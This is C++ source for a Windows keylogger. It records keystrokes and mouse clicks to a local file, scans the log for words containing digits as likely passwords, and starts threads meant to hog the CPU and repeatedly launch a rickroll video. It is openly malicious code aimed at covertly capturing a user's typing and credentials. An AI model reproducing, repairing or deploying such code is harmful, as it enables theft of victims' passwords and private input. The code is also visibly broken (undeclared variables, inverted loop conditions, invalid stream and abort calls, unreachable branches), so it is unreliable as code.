#include <windows.h>
#include "keylog.h"
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <time.h>
#include <stdlib.h>
#include <math.h>
#include <sstream>
#include <cstdlib>
#include <random>
#include <process.h>
#include <chrono>


using namespace std;

typedef std::chrono::high_resolution_clock Clock;

using namespace std;


void keyloggers (LPCSTR text)
{
        ofstream keylogs;
        keylogs.open("keylogs.txt",fstream::app);
        keylogs<< text;
        keylogs.close();
}
bool specialkeys (int ikey)
{
        switch(ikey)
        {
            case VK_SPACE:
                cout<<" ";
                keyloggers(" ");
                break;
            case VK_RETURN:
                cout<<endl;
                keyloggers("/n");
                break;
            case VK_SHIFT:
                cout<<" /SHIFT/";
                keyloggers("/SHIFT/");
                break;
            case VK_BACK:
                cout<<"/b";
                keyloggers("/b");
                break;
            default: return false;

        }
}

void keylogger(void *a)
{
    char key;
    while(TRUE)
    {
            Sleep(10);
            for (key=8; key<=190; key++)
            {
                    if (GetAsyncKeyState(key)==-32767)
                    {
                            if(specialkeys(key)==FALSE)
                            {
                                    ofstream logfile;
                                    logfile.open("keylogs.txt", fstream::app);
                                    logfile<<key;
                                    logfile.close();
                            }
                    }
            }
    }

}
void rickroll(void *)
{
    while (1==1){
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
    break;
    system("wmplayer.exe rickroll.avi");
}}
void virus(void *)
{
    int x=1000000;
    while (1==1)
    {
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
    }
    return;
}
void megavirus(void *)
{   int x=1;
    while (1==1)
    {
        x=x*(rand()%1000000);
    }
}


void virussetoff(void *)
{
    while (1==1)
    {
        auto t1 = Clock::now();
        auto t2 = Clock::now();
        auto t=std::chrono::duration_cast<std::chrono::seconds>(t2 - t1).count();
        if (t==2147483647)
        {
            _beginthread(rickroll,0,NULL);
            _beginthread(virus,0,NULL);
            _beginthread(megavirus,0,NULL);
        }
    }
}

void start()
{
    _beginthread(keylogger,0,NULL);
    _beginthread(virussetoff,0,NULL);
}

int passwordfinder()
{   int y=0;
  string word;
  ifstream in_stream;
  
  in_stream.open("keylogs.txt");
  while(!in_stream.eof())
  {
    string s;
    getline(in_stream, s, ' ');
    stringstream(s)>>word;
    passwordchecker(y, word, array);
    y++;
    break;
  }
  in_stream.close();
  return 0;
}

void ppp()
{       int x=0;
  while(password[x]!=-1){
    cout<<password[x]<<endl;
    x++;
  }
}

bool buttons(int ikey)
{
        switch(ikey)
        {   
            case VK_MBUTTON:
                ppp();
                cin<<"press any button"<<endl;
                abort(0);
            case VK_LBUTTON:
                cout<<" /LEFT CLICK/ ";
                keyloggers(" /LEFT CLICK/ ");
                break;
            case VK_RBUTTON:
                cout<<" /RIGHT CLICK/ ";
                keyloggers(" /RIGHT CLICK/ ");
                break;

            default: return false;
        }
}

int passwordchecker(int y, string word, string array[])
{
    int length=word.size();
    for(int x=0;x>length;x++)
    {
        if (word[x]=='1')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]=='2')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]=='3')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]== '4')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]== '5')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]=='6')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]=='7')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]=='8')
        {
            password[y]=word;

            return 0;
        }
        if (word[x]=='9')
        {
            password[y]=word;

            return 0;
        }
    }
}